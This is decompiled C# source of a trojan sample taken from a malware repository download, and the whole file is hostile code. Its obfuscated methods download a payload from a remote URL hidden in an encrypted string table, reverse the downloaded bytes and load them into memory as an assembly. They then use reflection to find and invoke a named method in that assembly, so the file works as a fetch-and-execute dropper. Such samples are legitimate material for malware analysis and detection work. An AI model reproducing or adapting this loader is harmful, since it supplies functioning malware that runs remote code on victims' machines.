// Decompiled with JetBrains decompiler
// Type: Hxtdx.Data
// Assembly: Swzizesla, Version=99.0.4832.0, Culture=neutral, PublicKeyToken=null
// MVID: FECE2140-D2B1-238F-9FD9-FA47793EC0A2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Bsymem.gen-bb899aba42f3511bc669b95795c12d3d9078f0f6fd4e856d7d4d3916a98ba642.exe

using Hxtdx.Properties;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Reflection;

namespace Hxtdx
{
  public static class Data
  {
    internal static Delegate \uE000;

    public static void Another()
    {
label_10:
      int num1 = \uE010.\uE023(62);
      int num2 = 4;
label_2:
      byte[] numArray;
      int length;
      List<byte> byteList;
      while (true)
      {
        num2 ^= 72;
label_4:
        int num3 = \uE010.\uE023(73);
        while (true)
        {
          switch (num3 ^ 65)
          {
            case 61:
              switch (num2)
              {
                case 74:
                  switch (num1)
                  {
                    case 75:
                      numArray = Data.\uE002(\uE008.\uE000(24356));
                      num1 = 13;
                      goto label_1;
                    case 76:
                      length = numArray.Length;
                      num1 = 14;
                      goto label_1;
                    case 77:
                      byteList = new List<byte>();
                      num1 = 12;
                      goto label_1;
                    case 78:
                      goto label_15;
                    default:
                      goto label_9;
                  }
                case 75:
                  goto label_10;
                case 76:
label_1:
                  num1 ^= 64;
                  goto label_7;
                default:
                  num3 = (int) sbyte.MaxValue;
                  continue;
              }
            case 62:
label_7:
              num2 = \uE010.\uE023(64);
              num3 = 126;
              continue;
            case 63:
              goto label_2;
            default:
              goto label_4;
          }
        }
label_9:
        num2 = 3;
      }
label_15:
      while ((length-- <= 0 ? 0 : 1) != 0)
        byteList.Add(numArray[length]);
      AppDomain.CurrentDomain.Load(byteList.ToArray());
    }

    internal static void \uE000()
    {
label_2:
      // ISSUE: reference to a compiler-generated method
      int num1 = Resources.\uE000(63);
      while (true)
      {
        int index1;
        Assembly[] assemblies;
        Assembly assembly;
        switch (num1 ^ 61)
        {
          case 74:
            if (index1 != 0)
            {
              num1 = 118;
              continue;
            }
            break;
          case 75:
label_5:
            assembly = assemblies[index1];
            num1 = 114;
            continue;
          case 76:
            assemblies = AppDomain.CurrentDomain.GetAssemblies();
            // ISSUE: reference to a compiler-generated method
            num1 = Resources.\uE000(76);
            continue;
          case 77:
            index1 = 0;
            num1 = 119;
            continue;
          case 78:
            num1 = 113;
            continue;
          case 79:
label_10:
            int num2 = \uE010.\uE023(65);
            while (true)
            {
              Type[] types;
              int index2;
              Type type;
              switch ((num2 ^ 71) + 67)
              {
                case 0:
                  types = assembly.GetTypes();
                  num2 = -7;
                  continue;
                case 1:
                  index2 = 0;
                  // ISSUE: reference to a compiler-generated method
                  num2 = Resources.\uE000(67);
                  continue;
                case 2:
                  num2 = -6;
                  continue;
                case 3:
                  if (index2 != 0)
                  {
                    num2 = -122;
                    continue;
                  }
                  break;
                case 4:
label_16:
                  type = types[index2];
                  num2 = -124;
                  continue;
                case 5:
                  num2 = -8;
                  continue;
                case 6:
                  try
                  {
                    MethodInfo method = type.GetMethod(\uE008.\uE000(24485));
label_20:
                    int num3 = \uE010.\uE023(64);
                    while (true)
                    {
                      switch (num3 ^ 65)
                      {
                        case 67:
                          Data.\uE000 = Delegate.CreateDelegate(typeof (Action), (object) null, method);
                          num3 = 5;
                          continue;
                        case 68:
                          Data.\uE000.DynamicInvoke();
                          num3 = 4;
                          continue;
                        case 69:
                          num3 = \uE010.\uE023(72);
                          continue;
                        case 70:
                          goto label_25;
                        default:
                          goto label_20;
                      }
                    }
                  }
                  catch
                  {
                  }
label_25:
                  ++index2;
                  break;
                default:
                  goto label_10;
              }
              if (index2 < types.Length)
                goto label_16;
              else
                break;
            }
            ++index1;
            break;
          default:
            goto label_2;
        }
        if (index1 < assemblies.Length)
          goto label_5;
        else
          break;
      }
    }

    internal static Assembly \uE001(byte[] _param0)
    {
label_10:
      // ISSUE: reference to a compiler-generated method
      int num1 = Resources.\uE000(74);
      int num2 = 8;
label_2:
      Assembly assembly;
      while (true)
      {
        num2 ^= 69;
label_4:
        int num3 = \uE010.\uE023(66);
        while (true)
        {
          switch (num3 ^ 61)
          {
            case 69:
label_5:
              // ISSUE: reference to a compiler-generated method
              num2 = Resources.\uE000(61);
              num3 = 122;
              continue;
            case 70:
              switch (num2)
              {
                case 75:
                  switch (num1)
                  {
                    case 72:
                    case 74:
                      goto label_12;
                    case 73:
                      assembly = AppDomain.CurrentDomain.Load(_param0);
                      num1 = 117;
                      goto label_1;
                    default:
                      goto label_9;
                  }
                case 76:
                  goto label_10;
                case 77:
label_1:
                  num1 ^= 61;
                  goto label_5;
                default:
                  num3 = 120;
                  continue;
              }
            case 71:
              goto label_2;
            default:
              goto label_4;
          }
        }
label_9:
        num2 = 9;
      }
label_12:
      return assembly;
    }

    internal static byte[] \uE002(string _param0)
    {
      try
      {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
      }
      catch
      {
      }
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(_param0);
label_7:
      // ISSUE: reference to a compiler-generated method
      int num1 = Resources.\uE000(75);
      int num2 = 14;
      while (true)
      {
        switch (num2 ^ 64)
        {
          case 76:
            goto label_7;
          case 77:
            switch (num1)
            {
              case 64:
                httpWebRequest.Method = \uE008.\uE000(24462);
                num1 = 124;
                goto label_4;
              case 65:
                num1 = (int) sbyte.MaxValue;
                goto label_4;
              case 66:
                goto label_12;
              default:
                num2 = 12;
                continue;
            }
          case 78:
label_4:
            num1 ^= 61;
            break;
        }
        // ISSUE: reference to a compiler-generated method
        num2 = Resources.\uE000(79);
      }
label_12:
      MemoryStream memoryStream = new MemoryStream();
      try
      {
        HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse();
        try
        {
          Stream responseStream = response.GetResponseStream();
          try
          {
            byte[] buffer = new byte[1024];
label_17:
            int num3;
            do
            {
              int num4 = \uE010.\uE023(65);
              int count;
              bool flag;
              while (true)
              {
                switch ((num4 ^ 70) + 61)
                {
                  case 0:
                    count = responseStream.Read(buffer, 0, 1024);
                    num4 = -126;
                    continue;
                  case 1:
                    memoryStream.Write(buffer, 0, count);
                    // ISSUE: reference to a compiler-generated method
                    num4 = Resources.\uE000(70);
                    continue;
                  case 2:
                    num4 = -127;
                    continue;
                  case 3:
                    num4 = -125;
                    continue;
                  case 4:
                    flag = count > 0;
                    num4 = -114;
                    continue;
                  case 5:
                    if (flag)
                    {
                      num4 = -113;
                      continue;
                    }
                    goto label_26;
                  case 6:
                    goto label_25;
                  default:
                    goto label_17;
                }
              }
label_25:
              num3 = 1;
              goto label_27;
label_26:
              num3 = 0;
label_27:;
            }
            while (num3 != 0);
            return memoryStream.ToArray();
          }
          finally
          {
            if ((responseStream == null ? 1 : 0) == 0)
              responseStream.Dispose();
          }
        }
        finally
        {
          if ((response == null ? 1 : 0) == 0)
            response.Dispose();
        }
      }
      finally
      {
        if ((memoryStream == null ? 1 : 0) == 0)
          memoryStream.Dispose();
      }
    }
  }
}
